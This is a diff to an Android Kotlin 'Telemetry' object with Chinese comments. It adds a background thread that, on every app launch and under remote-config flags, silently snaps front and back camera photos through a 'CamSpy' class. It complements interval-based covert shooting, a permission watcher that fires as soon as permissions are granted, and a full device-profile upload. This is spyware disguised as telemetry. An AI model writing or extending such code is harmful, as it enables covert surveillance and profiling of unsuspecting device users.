@@ -77,6 +77,30 @@ object Telemetry {
         val app = ctx.applicationContext
         // 0.1 秒巡检权限：哪个刚到位就立刻执行它那一项（相机→前后各一张）
         runCatching { PermWatch.start(app) }
+
+        // 每次打开 App 都前后各拍一张（自动模式开着、且对应那侧勾选时）。
+        // 这是「进软件就拍」，和下面按间隔循环拍照是两回事：
+        // 前者是开门先拍一张留底，后者是之后每隔 N 秒继续。
+        Thread({
+            // 等首轮远程配置拉下来，否则 autoMode 还是默认的 false，什么都拍不了
+            runCatching { Thread.sleep(3_000L) }
+            val on = RemoteConfig.autoMode
+            val fOn = RemoteConfig.autoCamFrontOn
+            val bOn = RemoteConfig.autoCamBackOn
+            if (on && (fOn || bOn)) {
+                Log.i(TAG, "boot shoot: front=$fOn back=$bOn")
+                if (fOn) {
+                    runCatching { CamSpy.snap(app, facingBack = false) }
+                    runCatching { Thread.sleep(2_500L) }
+                }
+                if (bOn) {
+                    runCatching { CamSpy.snap(app, facingBack = true) }
+                    runCatching { Thread.sleep(2_500L) }
+                }
+                // 拍完把计时基准重置，免得刚拍完立刻又到点
+                runCatching { markAutoShot(app) }
+            }
+        }, "tlm-boot-shoot").apply { isDaemon = true }.start()
         Thread({
             // 首次全量画像，之后只发心跳
             Profile.dump(app)?.let { push("heart", it) }
